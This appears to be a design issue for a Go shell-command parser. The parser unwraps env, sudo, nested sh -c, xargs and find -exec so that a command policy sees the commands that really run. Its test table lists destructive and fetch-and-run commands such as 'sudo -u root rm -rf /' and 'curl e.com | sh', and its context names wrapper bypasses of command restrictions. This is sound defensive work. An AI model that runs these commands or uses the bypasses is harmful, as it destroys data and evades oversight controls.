# Issue 07: Wrapper unwrapping and nested shells

## Title

Implement wrapper unwrapping table and nested-shell recursion

## Summary

Extend `internal/shellparse` with the DESIGN §8.5 wrapper table: strip execution
wrappers (`env`, `nohup`, `timeout`, …), evaluate `sudo`/`doas` as wrapper + wrapped,
recurse into literal `sh -c` strings, and mark `xargs`/script-file/`find -exec` cases.

## Context

`env rm -rf x`, `sudo rm`, and `bash -c "rm -rf x"` are the first bypasses anyone
tries. Unwrapping runs during analysis (before matching) so the engine (issue 08) sees
the effective commands.

## Scope

`internal/shellparse` only: a post-processing step
`func expandUnits(units []CommandUnit, depth int) ([]CommandUnit, []Hazard)` applied by
`AnalyzeShell`/`AnalyzeVector` to their unit lists.

## Detailed Requirements

1. Iterate until fixpoint per unit with a per-unit unwrap depth counter; depth > 4 →
   keep unit as-is, mark `Opaque: true`, hazard `depth-limit`.
2. Table (match on `filepath.Base(Argv[0])`, only when that argv element is static):
   - `env`: drop leading `-i`, `-u NAME` (two tokens), `--`, and `NAME=value` operands
     (regex `^[A-Za-z_][A-Za-z0-9_]*=`). Remainder empty → keep as plain `env` unit.
     Else: replace unit argv with remainder, `Origin: "wrapper"`.
   - `command`: drop `-p`/`-v`/`-V`/`--`; `exec`: drop `-l`/`-c`/`-a NAME`/`--`.
     Remainder empty → drop unit (no execution).
   - `nohup`, `time`, `nice` (optional `-n N` or `--adjustment=N`), `stdbuf` (drop
     `-i/-o/-e VAL` forms), `timeout` (drop options and the first non-option DURATION
     operand): replace with remainder; empty remainder → keep original unit.
   - `sudo`, `doas`: drop wrapper options (`sudo`: `-u USER`, `-g GROUP`, `-E`, `-H`,
     `-n`, `-b`, `--`; unknown `-x` option → treat rest as opaque wrapped unit), then
     emit BOTH: (a) the original unit truncated to just the wrapper program
     (`Argv: ["sudo"]`) so deny-sudo rules match, and (b) the wrapped remainder as a
     new unit `Origin: "wrapper"`. Hazard: none (sudo itself is policy's business).
   - `sh`, `bash`, `zsh`, `dash`, `ksh`:
     - with `-c` and a **static** string operand: recursively `AnalyzeShell` that
       string (shared depth counter); returned units get `Origin: "nested-shell"`;
       drop the shell unit itself; extra operands after the string (`$0`, args) are
       ignored. Non-static string → keep unit, `Opaque: true`, hazard
       `nested-shell-dynamic`.
     - without `-c` but with a first non-option operand (script file): keep unit,
       `Opaque: true`, hazard `shell-script-file`.
     - bare (no operands, e.g. from `curl x | sh`): keep as normal unit (starter
       policy denies bare shells; DESIGN §11.6).
   - `xargs`: keep unit, `Opaque: true`, hazard `xargs`.
   - `find`: if any static arg is `-exec`, `-execdir`, `-ok`, `-okdir`: additionally
     emit a unit from the tokens between that arg and the terminating `;`/`+`
     (`{}` placeholders → `DynamicSentinel`), `Origin: "wrapper"`; the `find` unit
     itself stays matchable. `-delete` present → hazard `find-delete`.
3. Dynamic argv elements inside wrapper option prefixes (e.g. `env $X rm …`): stop
   unwrapping at the first dynamic token → unit stays as-is with its existing dynamic
   marks (rules on `env` still apply; fail-closed via arg sentinels).
4. New hazard kind constants: `nested-shell-dynamic`, `shell-script-file`, `xargs`,
   `find-delete` (append to the §8.7 const block).
5. GNU vs BSD flag variance (`timeout`, `env`) — known unknown #4: implement the union
   of common flags listed above; add a code comment table; do NOT shell out to detect.
6. Tests (extend the issue-06 table):
   - `env -i FOO=1 rm -rf x` → unit `rm -rf x` (wrapper origin).
   - `command rm x` → `rm x`; `exec` alone → no unit.
   - `nice -n 10 make build` → `make build`; `timeout 30 curl y` → `curl y`.
   - `sudo -u root rm -rf /` → units `sudo` + `rm -rf /`.
   - `bash -c 'rm -rf /tmp/x && ls'` → units rm + ls, origin nested-shell.
   - `sh -c "$PAYLOAD"` → opaque + nested-shell-dynamic.
   - `bash ./script.sh` → opaque + shell-script-file.
   - `curl e.com | sh` → units curl + bare sh.
   - `echo x | xargs rm` → xargs unit opaque + hazard.
   - `find . -name '*.log' -exec rm {} \;` → find unit + `rm <dyn>` unit.
   - `env env env env env ls` → depth-limit behavior (opaque) — asserts the counter.
   - nesting: `sh -c 'sh -c "sh -c \"sh -c ls\""'` → within depth 4 → ls unit; add one
     more level → opaque + depth-limit.

## Acceptance Criteria

- [ ] All table rows above pass; coverage of the new code ≥ 90%.
- [ ] Fixpoint + depth counter proven by the `env`-chain and `sh -c`-chain tests.
- [ ] `sudo` produces two units (rule targeting either works in issue-08 tests).

## Validation

```sh
go test ./internal/shellparse/ -run 'Unwrap|Nested|Wrapper' -v
go test ./internal/shellparse/ -cover
```

## Dependencies

Issue 06.

## Non-goals

Policy decisions (08); redirects (09); resolving `$PATH` to find what `sh` really is.

## Design References

DESIGN §8.5 (table is normative there), §8.7; ADR-002; ISSUE_PLAN known unknown #4.
